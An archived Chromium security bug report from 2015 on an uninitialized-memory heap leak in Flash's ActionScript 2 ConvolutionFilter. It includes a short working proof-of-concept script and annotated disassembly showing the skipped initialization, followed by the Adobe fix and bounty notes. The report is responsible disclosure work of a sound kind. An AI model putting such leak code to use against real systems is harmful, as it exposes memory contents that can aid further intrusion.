# Security: Flash AS2 ConvolutionFilter Uninitialized Memory Leak

| Field | Value |
|-------|-------|
| **Issue ID** | [40081395](https://issues.chromium.org/issues/40081395) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>Plugins>Flash |
| **Reporter** | bi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-02-11 |
| **Bounty** | $4,000.00 |

## Description

**VULNERABILITY DETAILS**  

When building a ConvolutionFilter in AS2, Flash does not initialize the content of the Matrix array, leaving the ability to disclose heap data.

**VERSION**  

Chrome Version: 40.0.2214.111 stable, Flash 16.0.0.305  

Operating System: Win7 SP1 x64

Compile with Flash CS5 and run convoleak.swf in the browser.

import flash.filters.ConvolutionFilter;

for (var i=0; i<0x10; i++) {  

var cf:ConvolutionFilter = new ConvolutionFilter(0x10, 0x10);  

var tf:TextField = this.createTextField("tf", 50+i, 20, 20+20\*i, 400, 20);

```
tf.text = cf.matrix.join(",");  
this.addChild(tf)  

```

}

## Attachments

- [flash-convo-leak.zip](attachments/flash-convo-leak.zip) (application/zip, 5.4 KB)

## Timeline

### in...@chromium.org (2015-02-12)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-02-12)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-02-12)

Nice. @biloulehibou, just to quickly check, do those floating point values convert cleanly to pointers, etc.?

### sc...@gmail.com (2015-02-12)

Report sent to Adobe.

### sc...@gmail.com (2015-02-12)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-02-12)

Adobe tracking as PSIRT-3308

### bi...@gmail.com (2015-02-13)

Yes, the buffer is untouched. Look at the ConvolutionFilter constructor at pepflashplayer.dll + 0x2DB560:

.text:102DB639 loc_102DB639:
.text:102DB639                 mov     eax, [ebx+18h]
.text:102DB63C                 imul    eax, [ebx+14h]
.text:102DB640                 mov     [ebx+20h], eax
.text:102DB643                 test    eax, eax
.text:102DB645                 jz      short loc_102DB684
.text:102DB647                 xor     ecx, ecx
.text:102DB649                 shld    ecx, eax, 2
.text:102DB64D                 add     eax, eax
.text:102DB64F                 lea     esi, [eax+eax]            ; esi = 4 * x * y
...
.text:102DB672
.text:102DB672 loc_102DB672:
.text:102DB672                 mov     ecx, dword_10DCC090
.text:102DB678                 push    0
.text:102DB67A                 mov     eax, esi
.text:102DB67C                 call    sub_1056EC10              ; allocate space for the matrix array
.text:102DB681                 mov     [ebx+1Ch], eax
.text:102DB684
.text:102DB684 loc_102DB684:
.text:102DB684                 cmp     dword ptr [edi+8], 2      ; skip the initialization if the matrix argument is not provided
.text:102DB688                 jle     short loc_102DB6A3
.text:102DB68A                 mov     ecx, [ebx+20h]
.text:102DB68D                 mov     edx, [ebx+1Ch]
.text:102DB690                 mov     eax, [edi+0Ch]
.text:102DB693                 push    ecx
.text:102DB694                 mov     ecx, [edi]
.text:102DB696                 push    edx
.text:102DB697                 add     eax, 8
.text:102DB69A                 push    ecx
.text:102DB69B                 call    sub_1017FC70              ; that should initialize the buffer
.text:102DB6A0                 add     esp, 0Ch
.text:102DB6A3

The buffer is just left as is, and you can use matrix[k] to read anything you want.

### sc...@gmail.com (2015-04-10)

[Empty comment from Monorail migration]

### [Deleted User] (2015-05-01)

Was fixed: https://helpx.adobe.com/security/products/flash-player/apsb15-06.html

### cl...@chromium.org (2015-08-08)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-08-17)

As discussed, reward should arrive this week.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-03)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/457583?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081395)*
